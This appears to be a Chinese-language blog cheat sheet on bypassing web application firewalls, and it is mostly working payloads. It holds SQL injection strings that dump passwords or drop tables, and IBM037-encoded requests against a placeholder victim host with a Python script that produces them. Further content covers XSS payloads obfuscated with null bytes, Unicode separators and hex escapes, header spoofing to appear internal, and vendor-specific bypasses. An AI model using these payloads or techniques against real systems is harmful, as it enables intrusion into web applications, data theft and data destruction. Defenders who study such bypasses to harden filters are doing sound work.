+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Attacks on tokenizers attempt to break the logic of splitting a request into tokens with the help of token breakers.</span><br><span class="line">Token breakers are symbols that allow affecting the correspondence between an element of a string and a certain token, and thus bypass search by signature.</span><br><span class="line">However, the request must still remain valid while using token-breakers.</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Case: Unknown Token for the Tokenizer</span><br><span class="line"></span><br><span class="line">Payload: ?id&#x3D;‘-sqlite_version() UNION SELECT password FROM users --</span><br><span class="line"></span><br><span class="line">Case: Unknown Context for the Parser (Notice the uncontexted bracket)</span><br><span class="line"></span><br><span class="line">Payload 1: ?id&#x3D;123);DROP TABLE users --</span><br><span class="line"></span><br><span class="line">Payload 2: ?id&#x3D;1337) INTO OUTFILE ‘xxx’ --</span><br></pre></td></tr></table></figure>
+
+
+
+<blockquote>
+<p><strong>TIP:</strong> 更多payload可以看这里 cheat sheet.</p>
+</blockquote>
+<p><strong>14. 其他格式混淆</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">许多web应用程序支持不同的编码类型(如下表)</span><br><span class="line"></span><br><span class="line">混淆成服务器可解析、waf不可解析的编码类型</span><br></pre></td></tr></table></figure>
+
+<p><strong>Case:</strong> IIS</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">IIS6, 7.5, 8 and 10 (ASPX v4.x) 允许 IBM037 字符</span><br><span class="line"></span><br><span class="line">可以发送编码后的参数名和值</span><br></pre></td></tr></table></figure>
+
+<p>原始请求:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;sample.aspx?id1&#x3D;something HTTP&#x2F;1.1</span><br><span class="line">HOST: victim.com</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded; charset&#x3D;utf-8</span><br><span class="line">Content-Length: 41</span><br><span class="line"></span><br><span class="line">id2&#x3D;&#39;union all select * from users--</span><br></pre></td></tr></table></figure>
+
+
+
+<p>混淆请求 + URL Encoding:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;sample.aspx?%89%84%F1&#x3D;%A2%96%94%85%A3%88%89%95%87 HTTP&#x2F;1.1</span><br><span class="line">HOST: victim.com</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded; charset&#x3D;ibm037</span><br><span class="line">Content-Length: 115</span><br><span class="line"></span><br><span class="line">%89%84%F2&#x3D;%7D%A4%95%89%96%95%40%81%93%93%40%A2%85%93%85%83%A3%40%5C%40%86%99%96%94%40%A4%A2%85%99%A2%60%60</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>TIP:</strong> 可以使用 这个小脚本 来转化编码</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">import urllib.parse, sys</span><br><span class="line">from argparse import ArgumentParser</span><br><span class="line">lackofart &#x3D; &#39;&#39;&#39;</span><br><span class="line">        OBFUSCATOR</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line"></span><br><span class="line">def paramEncode(params&#x3D;&quot;&quot;, charset&#x3D;&quot;&quot;, encodeEqualSign&#x3D;False, encodeAmpersand&#x3D;False, urlDecodeInput&#x3D;True, urlEncodeOutput&#x3D;True):</span><br><span class="line">    result &#x3D; &quot;&quot;</span><br><span class="line">    equalSign &#x3D; &quot;&#x3D;&quot;</span><br><span class="line">    ampersand &#x3D; &quot;&amp;&quot;</span><br><span class="line">    if &#39;&#x3D;&#39; and &#39;&amp;&#39; in params:</span><br><span class="line">        if encodeEqualSign:</span><br><span class="line">            equalSign &#x3D; equalSign.encode(charset)</span><br><span class="line">        if encodeAmpersand:</span><br><span class="line">            ampersand &#x3D; ampersand.encode(charset)</span><br><span class="line">        params_list &#x3D; params.split(&quot;&amp;&quot;)</span><br><span class="line">        for param_pair in params_list:</span><br><span class="line">            param, value &#x3D; param_pair.split(&quot;&#x3D;&quot;)</span><br><span class="line">            if urlDecodeInput:</span><br><span class="line">                param &#x3D; urllib.parse.unquote(param)</span><br><span class="line">                value &#x3D; urllib.parse.unquote(value)</span><br><span class="line">            param &#x3D; param.encode(charset)</span><br><span class="line">            value &#x3D; value.encode(charset)</span><br><span class="line">            if urlEncodeOutput:</span><br><span class="line">                param &#x3D; urllib.parse.quote_plus(param)</span><br><span class="line">                value &#x3D; urllib.parse.quote_plus(value)</span><br><span class="line">            if result:</span><br><span class="line">                result +&#x3D; ampersand</span><br><span class="line">            result +&#x3D; param + equalSign + value</span><br><span class="line">    else:</span><br><span class="line">        if urlDecodeInput:</span><br><span class="line">            params &#x3D; urllib.parse.unquote(params)</span><br><span class="line">        result &#x3D; params.encode(charset)</span><br><span class="line">        if urlEncodeOutput:</span><br><span class="line">            result &#x3D; urllib.parse.quote_plus(result)</span><br><span class="line">    return result</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    print(lackofart)</span><br><span class="line">    parser &#x3D; ArgumentParser(&#39;python3 obfu.py&#39;)</span><br><span class="line">    parser._action_groups.pop()</span><br><span class="line"></span><br><span class="line">    # A simple hack to have required arguments and optional arguments separately</span><br><span class="line">    required &#x3D; parser.add_argument_group(&#39;Required Arguments&#39;)</span><br><span class="line">    optional &#x3D; parser.add_argument_group(&#39;Optional Arguments&#39;)</span><br><span class="line"></span><br><span class="line">    # Required Options</span><br><span class="line">    required.add_argument(&#39;-s&#39;, &#39;--str&#39;, help&#x3D;&#39;String to obfuscate&#39;, dest&#x3D;&#39;str&#39;)</span><br><span class="line">    required.add_argument(&#39;-e&#39;, &#39;--enc&#39;, help&#x3D;&#39;Encoding type. eg: ibm037, utf16, etc&#39;, dest&#x3D;&#39;enc&#39;)</span><br><span class="line"></span><br><span class="line">    # Optional Arguments (main stuff and necessary)</span><br><span class="line">    optional.add_argument(&#39;-ueo&#39;, help&#x3D;&#39;URL Encode Output&#39;, dest&#x3D;&#39;ueo&#39;, action&#x3D;&#39;store_true&#39;)</span><br><span class="line">    optional.add_argument(&#39;-udi&#39;, help&#x3D;&#39;URL Decode Input&#39;, dest&#x3D;&#39;udi&#39;, action&#x3D;&#39;store_true&#39;)</span><br><span class="line">    args &#x3D; parser.parse_args()</span><br><span class="line">    if not len(sys.argv) &gt; 1:</span><br><span class="line">        parser.print_help()</span><br><span class="line">        quit()</span><br><span class="line">    print(&#39;Input: %s&#39; % (args.str))</span><br><span class="line">    print(&#39;Output: %s&#39; % (paramEncode(params&#x3D;args.str, charset&#x3D;args.enc, urlDecodeInput&#x3D;args.udi, urlEncodeOutput&#x3D;args.ueo)))</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th align="left">服务器信息</th>
+<th align="left">可用编码</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Nginx, uWSGI-Django-Python3</td>
+<td align="left">IBM037, IBM500, cp875, IBM1026, IBM273</td>
+<td align="left">对参数名和参数值进行编码 服务器会对参数名和参数值均进行url解码 需要对等号和&amp; and进行编码(不进行url编码)</td>
+</tr>
+<tr>
+<td align="left">Nginx, uWSGI-Django-Python2</td>
+<td align="left">IBM037, IBM500, cp875, IBM1026, utf-16, utf-32, utf-32BE, IBM424</td>
+<td align="left">对参数名和参数值进行便慢慢 服务器会对参数名和参数值均进行url解码 等号和&amp;符号不应该以任何方式编码。</td>
+</tr>
+<tr>
+<td align="left">Apache-TOMCAT8-JVM1.8-JSP</td>
+<td align="left">IBM037, IBM500, IBM870, cp875, IBM1026, IBM01140, IBM01141, IBM01142, IBM01143, IBM01144, IBM01145, IBM01146, IBM01147, IBM01148, IBM01149, utf-16, utf-32, utf-32BE, IBM273, IBM277, IBM278, IBM280, IBM284, IBM285, IBM290, IBM297, IBM420, IBM424, IBM-Thai, IBM871, cp1025</td>
+<td align="left">参数名按原始格式(可以像往常一样使用url编码) Body 不论是否经过url编码均可 等号和&amp;符号不应该以任何方式编码</td>
+</tr>
+<tr>
+<td align="left">Apache-TOMCAT7-JVM1.6-JSP</td>
+<td align="left">IBM037, IBM500, IBM870, cp875, IBM1026, IBM01140, IBM01141, IBM01142, IBM01143, IBM01144, IBM01145, IBM01146, IBM01147, IBM01148, IBM01149, utf-16, utf-32, utf-32BE, IBM273, IBM277, IBM278, IBM280, IBM284, IBM285, IBM297, IBM420, IBM424, IBM-Thai, IBM871, cp1025</td>
+<td align="left">参数名按原始格式(可以像往常一样使用url编码) Body 不论是否经过url编码均可 等号和&amp;符号不应该以任何方式编码</td>
+</tr>
+<tr>
+<td align="left">IIS6, 7.5, 8, 10 -ASPX (v4.x)</td>
+<td align="left">IBM037, IBM500, IBM870, cp875, IBM1026, IBM01047, IBM01140, IBM01141, IBM01142, IBM01143, IBM01144, IBM01145, IBM01146, IBM01147, IBM01148, IBM01149, utf-16, unicodeFFFE, utf-32, utf-32BE, IBM273, IBM277, IBM278, IBM280, IBM284, IBM285, IBM290, IBM297, IBM420,IBM423, IBM424, x-EBCDIC-KoreanExtended, IBM-Thai, IBM871, IBM880, IBM905, IBM00924, cp1025</td>
+<td align="left">参数名按原始格式(可以像往常一样使用url编码) Body 不论是否经过url编码均可 等号和&amp;符号不应该以任何方式编码</td>
+</tr>
+</tbody></table>
+<h3 id="0X04-HTTP-参数污染"><a href="#0X04-HTTP-参数污染" class="headerlink" title="0X04    HTTP 参数污染"></a><strong>0X04    HTTP 参数污染</strong></h3><h4 id="手法"><a href="#手法" class="headerlink" title="手法"></a>手法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">这种攻击方法基于服务器如何解释具有相同名称的参数</span><br><span class="line">可能造成bypass的情况:</span><br><span class="line">服务器使用最后接收到的参数，WAF只检查第一个参数</span><br><span class="line">服务器将来自类似参数的值联合起来，WAF单独检查它们</span><br></pre></td></tr></table></figure>
+
+<p>下面是相关服务器对参数解释的比较</p>
+<table>
+<thead>
+<tr>
+<th align="left">环境</th>
+<th align="left">参数解析</th>
+<th align="left">示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">ASP/IIS</td>
+<td align="left">用逗号连接</td>
+<td align="left">par1=val1,val2</td>
+</tr>
+<tr>
+<td align="left">JSP, Servlet/Apache Tomcat</td>
+<td align="left">第一个参数是结果</td>
+<td align="left">par1=val1</td>
+</tr>
+<tr>
+<td align="left">ASP.NET/IIS</td>
+<td align="left">用逗号连接</td>
+<td align="left">par1=val1,val2</td>
+</tr>
+<tr>
+<td align="left">PHP/Zeus</td>
+<td align="left">最后一个参数是结果</td>
+<td align="left">par1=val2</td>
+</tr>
+<tr>
+<td align="left">PHP/Apache</td>
+<td align="left">最后一个参数是结果</td>
+<td align="left">par1=val2</td>
+</tr>
+<tr>
+<td align="left">JSP, Servlet/Jetty</td>
+<td align="left">第一个参数是结果</td>
+<td align="left">par1=val1</td>
+</tr>
+<tr>
+<td align="left">IBM Lotus Domino</td>
+<td align="left">第一个参数是结果</td>
+<td align="left">par1=val1</td>
+</tr>
+<tr>
+<td align="left">IBM HTTP Server</td>
+<td align="left">最后一个参数是结果</td>
+<td align="left">par1=val2</td>
+</tr>
+<tr>
+<td align="left">mod_perl, libapeq2/Apache</td>
+<td align="left">第一个参数是结果</td>
+<td align="left">par1=val1</td>
+</tr>
+<tr>
+<td align="left">Oracle Application Server 10G</td>
+<td align="left">第一个参数是结果</td>
+<td align="left">par1=val1</td>
+</tr>
+<tr>
+<td align="left">Perl CGI/Apache</td>
+<td align="left">第一个参数是结果</td>
+<td align="left">par1=val1</td>
+</tr>
+<tr>
+<td align="left">Python/Zope</td>
+<td align="left">第一个参数是结果</td>
+<td align="left">par1=val1</td>
+</tr>
+<tr>
+<td align="left">IceWarp</td>
+<td align="left">返回一个列表</td>
+<td align="left">[‘val1’,’val2’]</td>
+</tr>
+<tr>
+<td align="left">AXIS 2400</td>
+<td align="left">最后一个参数是结果</td>
+<td align="left">par1=val2</td>
+</tr>
+<tr>
+<td align="left">DBMan</td>
+<td align="left">由两个波浪号连接起来</td>
+<td align="left">par1=val1~~val2</td>
+</tr>
+<tr>
+<td align="left">mod-wsgi (Python)/Apache</td>
+<td align="left">返回一个列表</td>
+<td align="left">ARRAY(0x8b9058c)</td>
+</tr>
+</tbody></table>
+<h3 id="0X05-浏览器的缺陷"><a href="#0X05-浏览器的缺陷" class="headerlink" title="0X05    浏览器的缺陷"></a><strong>0X05    浏览器的缺陷</strong></h3><h4 id="Charset-Bugs"><a href="#Charset-Bugs" class="headerlink" title="Charset Bugs:"></a>Charset Bugs:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">可以尝试 修改 charset header to 更高的 Unicode (eg. UTF-32)</span><br><span class="line"></span><br><span class="line">当网站解码的时候，触发payload</span><br></pre></td></tr></table></figure>
+
+<p>Example request:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;page.php?p&#x3D;∀㸀㰀script㸀alert(1)㰀&#x2F;script㸀 HTTP&#x2F;1.1</span><br><span class="line">Host: site.com</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko&#x2F;20100101 Firefox&#x2F;32.0</span><br><span class="line">Accept-Charset:utf-32; q&#x3D;0.5&lt;</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br></pre></td></tr></table></figure>
+
+<p>当站点加载时，将其编码为我们设置的UTF-32编码，然后由于页面的输出编码为UTF-8，将其呈现为:<code>&quot;alert (1) &lt;/ script&gt;</code> 从而触发xss</p>
+<p>完整url编码后的 payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%E2%88%80%E3%B8%80%E3%B0%80script%E3%B8%80alert(1)%E3%B0%80&#x2F;script%E3%B8%80</span><br></pre></td></tr></table></figure>
+
+<h4 id="Null-空字节"><a href="#Null-空字节" class="headerlink" title="Null 空字节"></a>Null 空字节</h4><p>空字节通常用作字符串终止符</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Payload 示例:</span><br><span class="line"></span><br><span class="line">&lt;scri%00pt&gt;alert(1);&lt;&#x2F;scri%00pt&gt;</span><br><span class="line">&lt;scri\x00pt&gt;alert(1);&lt;&#x2F;scri%00pt&gt;</span><br><span class="line">&lt;s%00c%00r%00%00ip%00t&gt;confirm(0);&lt;&#x2F;s%00c%00r%00%00ip%00t&gt;</span><br><span class="line">标准: &lt;a href&#x3D;&quot;javascript:alert()&quot;&gt;</span><br><span class="line">混淆: &lt;a href&#x3D;&quot;ja0x09vas0x0A0x0Dcript:alert(1)&quot;&gt;clickme&lt;&#x2F;a&gt;</span><br><span class="line">变形: &lt;a 0x00 href&#x3D;&quot;javascript:alert(1)&quot;&gt;clickme&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="解析错误"><a href="#解析错误" class="headerlink" title="解析错误"></a>解析错误</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">RFC 声明节点名不可以由空白起始</span><br><span class="line"></span><br><span class="line">但是我们可以使用特殊字符 &#96; %, &#x2F;&#x2F;, !, ?&#96;, etc.</span><br><span class="line"></span><br><span class="line">例子:</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;&#x2F; style&#x3D;x:expression\28write(1)\29&gt; - Works upto IE7 (Source)</span><br><span class="line"></span><br><span class="line">&lt;!--[if]&gt;&lt;script&gt;alert(1)&lt;&#x2F;script --&gt; - Works upto IE9 (Reference)</span><br><span class="line"></span><br><span class="line">&lt;?xml-stylesheet type&#x3D;&quot;text&#x2F;css&quot;?&gt;&lt;root style&#x3D;&quot;x:expression(write(1))&quot;&#x2F;&gt; - Works in IE7 (Reference)</span><br><span class="line"></span><br><span class="line">&lt;%div%20style&#x3D;xss:expression(prompt(1))&gt; - Works Upto IE7</span><br></pre></td></tr></table></figure>
+
+<h4 id="Unicode-分隔符"><a href="#Unicode-分隔符" class="headerlink" title="Unicode 分隔符"></a>Unicode 分隔符</h4><ul>
+<li>每个浏览器有不同的分隔分隔符</li>
+</ul>
+<p>@Masato Kinugawafuzz 后发现如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">IExplorer: 0x09, 0x0B, 0x0C, 0x20, 0x3B</span><br><span class="line"></span><br><span class="line">Chrome: 0x09, 0x20, 0x28, 0x2C, 0x3B</span><br><span class="line"></span><br><span class="line">Safari: 0x2C, 0x3B</span><br><span class="line"></span><br><span class="line">FireFox: 0x09, 0x20, 0x28, 0x2C, 0x3B</span><br><span class="line"></span><br><span class="line">Opera: 0x09, 0x20, 0x2C, 0x3B</span><br><span class="line"></span><br><span class="line">Android: 0x09, 0x20, 0x28, 0x2C, 0x3B</span><br></pre></td></tr></table></figure>
+
+<p>示例</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a&#x2F;onmouseover[\x0b]&#x3D;location&#x3D;&#39;\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x61\x6C\x65\x72\x74\x28\x30\x29\x3B&#39;&gt;pwn3d</span><br></pre></td></tr></table></figure>
+
+<h3 id="使用其他非典型等效语法结构替换"><a href="#使用其他非典型等效语法结构替换" class="headerlink" title="使用其他非典型等效语法结构替换"></a>使用其他非典型等效语法结构替换</h3><p>找的waf开发人员没有注意到的语句进行攻击</p>
+<p>一些WAF开发人员忽略的常见关键字:</p>
+<ul>
+<li><p>JavaScript functions:</p>
+</li>
+<li><ul>
+<li><code>window</code></li>
+<li><code>parent</code></li>
+<li><code>this</code></li>
+<li><code>self</code></li>
+</ul>
+</li>
+<li><p>Tag attributes:</p>
+</li>
+<li><ul>
+<li><code>onwheel</code></li>
+<li><code>ontoggle</code></li>
+<li><code>onfilterchange</code></li>
+<li><code>onbeforescriptexecute</code></li>
+<li><code>ondragstart</code></li>
+<li><code>onauxclick</code></li>
+<li><code>onpointerover</code></li>
+<li><code>srcdoc</code></li>
+</ul>
+</li>
+</ul>
+<p>SQL Operators</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">lpad</span><br><span class="line">lpad( string, padded_length, [ pad_string ] ) lpad函数从左边对字符串使用指定的字符进行填充</span><br><span class="line">  lpad(&#39;tech&#39;, 7); 将返回&#39; tech&#39;</span><br><span class="line">  lpad(&#39;tech&#39;, 2); 将返回&#39;te&#39;</span><br><span class="line">  lpad(&#39;tech&#39;, 8, &#39;0&#39;); 将返回&#39;0000tech&#39;</span><br><span class="line">  lpad(&#39;tech on the net&#39;, 15, &#39;z&#39;); 将返回&#39;tech on the net&#39;</span><br><span class="line">  lpad(&#39;tech on the net&#39;, 16, &#39;z&#39;); 将返回&#39;ztech on the net</span><br><span class="line">field</span><br><span class="line">FIELD(str,str1,str2,str3,...)</span><br><span class="line">返回的索引（从1开始的位置）的str在str1，str2，STR3，...列表中。如果str没有找到，则返回0。</span><br><span class="line">+---------------------------------------------------------+</span><br><span class="line">| FIELD(&#39;ej&#39;, &#39;Hej&#39;, &#39;ej&#39;, &#39;Heja&#39;, &#39;hej&#39;, &#39;foo&#39;) |</span><br><span class="line">+---------------------------------------------------------+</span><br><span class="line">| 2                                                       |</span><br><span class="line">+---------------------------------------------------------+</span><br></pre></td></tr></table></figure>
+
+<p><code>bit_count</code> 二进制数中包含1的个数。BIT_COUNT(10);因为10转成二进制是1010，所以该结果就是2</p>
+<p>示例payloads:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Case: XSS</span><br><span class="line">&lt;script&gt;window[&#39;alert&#39;](0)&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;parent[&#39;alert&#39;](1)&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;self[&#39;alert&#39;](2)&lt;&#x2F;script&gt;</span><br><span class="line">Case: SQLi</span><br><span class="line">SELECT if(LPAD(&#39; &#39;,4,version())&#x3D;&#39;5.7&#39;,sleep(5),null);</span><br><span class="line">1%0b||%0bLPAD(USER,7,1)</span><br><span class="line">可以使用许多替代原生JavaScript的方法:</span><br></pre></td></tr></table></figure>
+
+<p>JSFuck</p>
+<p>JJEncode</p>
+<p>XChars.JS</p>
+<h3 id="滥用SSL-TLS密码"><a href="#滥用SSL-TLS密码" class="headerlink" title="滥用SSL/TLS密码:"></a>滥用SSL/TLS密码:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">很多时候，服务器可以接收各种SSL&#x2F;TLS密码和版本的连接。</span><br><span class="line">初始化到waf不支持的版本</span><br><span class="line">找出waf支持的密码(通常WAF供应商文档对此进行了讨论)。</span><br><span class="line">找出服务器支持的密码(SSLScan这种工具可以帮助到你)。</span><br><span class="line">找出服务器支持但waf不支持的</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>Tool</strong>: abuse-ssl-bypass-waf</p>
+</blockquote>
+<h3 id="滥用-DNS-记录"><a href="#滥用-DNS-记录" class="headerlink" title="滥用 DNS 记录:"></a>滥用 DNS 记录:</h3><ul>
+<li>找到云waf后的源站</li>
+</ul>
+<blockquote>
+<p><strong>TIP:</strong> 一些在线资源 IP History 和 DNS Trails</p>
+</blockquote>
+<p><strong>Tool</strong>: bypass-firewalls-by-DNS-history</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash bypass-firewalls-by-DNS-history.sh -d &lt;target&gt; --checkall</span><br></pre></td></tr></table></figure>
+
+<h3 id="请求头欺骗"><a href="#请求头欺骗" class="headerlink" title="请求头欺骗"></a>请求头欺骗</h3><p>让waf以为请求来自于内部网络，进而不对其进行过滤。</p>
+<p>添加如下请求头</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">X-Originating-IP: 127.0.0.1</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">X-Remote-IP: 127.0.0.1</span><br><span class="line">X-Remote-Addr: 127.0.0.1</span><br><span class="line">X-Client-IP: 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<h3 id="Google-Dorks-Approach"><a href="#Google-Dorks-Approach" class="headerlink" title="Google Dorks Approach:"></a><strong>Google Dorks Approach:</strong></h3><p>应对已知WAF的绕过</p>
+<h4 id="搜索语法"><a href="#搜索语法" class="headerlink" title="搜索语法:"></a>搜索语法:</h4><h4 id="Normal-search"><a href="#Normal-search" class="headerlink" title="Normal search:"></a>Normal search:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+ waf bypass</span><br></pre></td></tr></table></figure>
+
+<p>Searching for specific version exploits:<br><code>&quot; &quot; (bypass|exploit)</code></p>
+<p>For specific type bypass exploits:<br><code>&quot;&quot; + (bypass|exploit)</code></p>
+<p>On Exploit DB:<br><code>site:exploit-db.com + bypass</code></p>
+<p>On 0Day Inject0r DB:<br><code>site:0day.today +  (bypass|exploit)</code></p>
+<p>On Twitter:<br><code>site:twitter.com + bypass</code></p>
+<p>On Pastebin<br><code>site:pastebin.com + bypass</code></p>
+<h2 id="0X06-拓展Bypass姿势"><a href="#0X06-拓展Bypass姿势" class="headerlink" title="0X06  拓展Bypass姿势"></a><strong>0X06  拓展Bypass姿势</strong></h2><h3 id="Airlock-Ergon"><a href="#Airlock-Ergon" class="headerlink" title="Airlock Ergon"></a><strong>Airlock Ergon</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SQLi Overlong UTF-8 Sequence Bypass (&gt;&#x3D; v4.2.4) by @Sec Consult</span><br><span class="line"></span><br><span class="line">%C0%80&#39;+union+select+col1,col2,col3+from+table+--+</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>AWS</strong></p>
+<p>SQLi Bypass by @enkaskal</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;; select * from TARGET_TABLE --</span><br><span class="line">XSS Bypass by @kmkz</span><br><span class="line">&lt;script&gt;eval(atob(decodeURIComponent(&quot;payload&quot;)))&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Barracuda"><a href="#Barracuda" class="headerlink" title="Barracuda"></a><strong>Barracuda</strong></h3><p>Cross Site Scripting by @WAFNinja</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;body style&#x3D;&quot;height:1000px&quot; onwheel&#x3D;&quot;alert(1)&quot;&gt;</span><br><span class="line">&lt;div contextmenu&#x3D;&quot;xss&quot;&gt;Right-Click Here&lt;menu id&#x3D;&quot;xss&quot; onshow&#x3D;&quot;alert(1)&quot;&gt;</span><br><span class="line">&lt;b&#x2F;%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>HTML Injection by @Global-Evolution</p>
